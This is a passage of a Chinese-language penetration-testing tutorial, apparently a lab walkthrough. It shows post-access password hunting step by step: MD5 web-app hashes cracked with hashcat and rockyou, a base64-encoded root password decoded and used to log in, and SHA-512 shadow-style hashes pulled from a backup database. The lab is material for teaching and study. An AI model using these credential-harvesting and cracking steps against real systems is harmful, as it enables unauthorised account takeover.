<p>我们可以将这些哈希带到攻击者机器上，就像我们对找到的 <strong>mysql</strong> 数据库凭据所做的那样，然后使用 <strong>hashcat</strong> 破解它们。但是，这些哈希与 Web 应用程序相关，而 Web 应用程序通常会使用某种哈希算法来存储密码。但目前，我们还不知道这些哈希是什么类型的。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="421使用-hashcat-破解-md5-哈希"><strong><div id="id4.2.1">4.2.1、使用 Hashcat 破解 md5 哈希</div></strong><a href="#421使用-hashcat-破解-md5-哈希" class="hash-link" aria-label="421使用-hashcat-破解-md5-哈希的直接链接" title="421使用-hashcat-破解-md5-哈希的直接链接">​</a></h6>
<p>我们要做的第一件事是确定这些哈希的类型。我们可以使用内置在 kali 中的一款名为 <strong>hash-identifier</strong> 的出色工具来做到这一点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849596-1365323968-add998b2e8e0adb78902c4a7662d3e62.png" width="634" height="337" class="img_ev3q"></p>
<p>执行命令 <strong>hash-idenfier</strong> 后，我们可以将其中一个哈希粘贴到 <strong>HASH:</strong> 字段中，然后它将尝试确定这是什么类型的哈希。</p>
<p>这里我们可以看到可能的哈希值为 <strong>MD5</strong> 或 <strong>MD4 域缓存凭证</strong>。由于这不是 Windows 机器，因此可以肯定这些是<strong>MD5</strong>。</p>
<p>现在我们知道了哈希类型，我们需要获取这两个哈希并将它们添加到攻击者机器上的 TXT 文件中，然后继续破解它们。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -h | grep -i &#x27;md5&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140851673-1710836917-0ea989a3df853f1fc31e6b82837fefc6.png" width="784" height="235" class="img_ev3q"></p>
<p>在检查破解模式时，我们看到很多结果都是 MD5，但这是一个原始 MD5 哈希值，因此我们需要使用破解模式 <strong>0</strong>。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 0 ./webapp.hash /usr/share/wordlists/rockyou.txt -o webapp_cracked.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140851503-1540047506-55e45c49d4c182bf70761ddbedfcf285.png" width="600" height="315" class="img_ev3q"></p>
<p>瞬间，哈希值就被成功破解（0 秒）。然后，检查密码文件，我们发现 <strong>devops</strong> 用户的密码与我们之前找到的密码相同，但 <strong>admin</strong> 用户的密码是新密码！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849032-1120021504-3b874cb5b16b794bc91704279e9aa5b4.png" width="380" height="78" class="img_ev3q"></p>
<p>好的，现在我们需要检查我们发现的另一个有趣的表 – “passwd”表。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43自建数据库中的密码哈希--base64"><strong><div id="id4.3">4.3、自建数据库中的密码哈希 – Base64</div></strong><a href="#43自建数据库中的密码哈希--base64" class="hash-link" aria-label="43自建数据库中的密码哈希--base64的直接链接" title="43自建数据库中的密码哈希--base64的直接链接">​</a></h4>
<p>就像我们已经做的那样，我们可以再次使用以下命令快速转储该表的所有行和列：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select * from passwd;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849192-1127311679-aae6249ac0cc0764b494eb3546087cfb.png" width="371" height="128" class="img_ev3q"></p>
<p>看起来我们找到了另外一个 root 密码，但从末尾的等号来看，它可能是 <strong>base64</strong> 编码的。</p>
<p><strong>SXNoYWxsbjB0YmVjcmFja2VkIQo=</strong></p>
<p>然而，当我们尝试直接使用它以 root 身份登录时，却失败了！</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="285" height="65" class="img_ev3q"></p>
<p>由于这不起作用，我们应该尝试进行 base64 解码。</p>
<blockquote>
<p>经常会发现经 base64 编码后的字符串是以一个或两个等号结尾，但情况并非总是如此。因此，当您发现任何主要由大写和小写字母组成的有趣字符串时，请首先检查它是否是 base64 编码的。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;SXNoYWxsbjB0YmVjcmFja2VkIQo=&#x27; | base64 --decode</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849505-1673548317-a827f40ee8b273a002c1f722a75781d5.png" width="475" height="61" class="img_ev3q"></p>
<p>Amazing！该字符串经过 base64 解码后变为：<strong>Ishalln0tbecracked！</strong></p>
<blockquote>
<p>一个好建议是将 base64 字符串和我们解码的实际密码都添加到密码文件中，因为这样会增加破解密码的可能性。</p>
</blockquote>
<p>当我们测试解码后的密码时，就可以以 root 身份登录！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140848992-480660574-8b084b3a8c5732947300156f32008839.png" width="389" height="91" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5密码搜寻--varbackups-文件夹"><strong><div id="id5">5、密码搜寻 – /var/backups 文件夹</div></strong><a href="#5密码搜寻--varbackups-文件夹" class="hash-link" aria-label="5密码搜寻--varbackups-文件夹的直接链接" title="5密码搜寻--varbackups-文件夹的直接链接">​</a></h2>
<p><strong>/var/backups</strong> 文件夹一般用于存储一些自动备份，例如 <strong>passwd</strong> 和 <strong>shadow</strong> 文件的备份。但是，默认备份文件将具有一组受限制的权限，就像实际文件一样。</p>
<p>本质上，我们正在寻找以下两种场景之一：</p>
<ol>
<li>备份文件夹中的文件具有弱权限，允许我们读取本不应该读取的文件。</li>
<li>文件夹中有我们可以读取的自定义文件。</li>
</ol>
<p>对于这个例子，我们将介绍场景 2。</p>
<p>导航到该文件夹，我们可以使用 <strong>ls -la</strong> 查看所有文件，包括任何隐藏文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849589-717277518-1983bc10892faeb47220774e64ad5175.png" width="474" height="223" class="img_ev3q"></p>
<p>我们可以看到所有默认文件（如 <strong>passwd</strong> 和 <strong>shadow</strong> 备份）都被锁定并归 root 所有（即只有 root 有权查看）。但是，我们可以看到这里有一个 db 文件，这种类型的文件通常是由 <strong>Sqlite3</strong> 构建的包含表、列和行的数据库。</p>
<p>如果我们尝试简单地 cat 此文件，我们将看到一堆乱码 – 就像用 cat 查看二进制文件一样。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850226-2026462759-c5724e596638375eac03866daf4dde5f.png" width="988" height="209" class="img_ev3q"></p>
<p>但是，与二进制文件类似，我们可以使用 <strong>strings</strong> 命令从文件中提取字符串。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strings ./pwds.db</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850135-1142862141-c1a194db53a5a63439492c1aa69a141b.png" width="983" height="237" class="img_ev3q"></p>
<p>在这里我们可以看到三个哈希值，其中有两个是唯一的一个是重复的，我们可以将其复制到攻击者的机器上并使用 hashcat 进行破解。这些哈希似乎也是来自 “$6” 的 unix OS 哈希值，这也是我们在 <strong>shadow</strong> 文件中经常看到的。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="51使用-hashcat-破解-shadow-哈希"><strong><div id="id5.1">5.1、使用 Hashcat 破解 shadow 哈希</div></strong><a href="#51使用-hashcat-破解-shadow-哈希" class="hash-link" aria-label="51使用-hashcat-破解-shadow-哈希的直接链接" title="51使用-hashcat-破解-shadow-哈希的直接链接">​</a></h4>
<p>由于我们只关心哈希本身，因此我们只需要从<code>$6$</code>复制到 SHA-512 字符串的末尾。将两者复制到攻击者的机器后，它应该如下所示：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140850779-470485213-9f18af18e90ca1b77bedcb86ebb85c5f.png" width="799" height="110" class="img_ev3q"></p>
<p>就像以前一样，我们首先搜索破解模式，然后我们就可以继续破解哈希。</p>
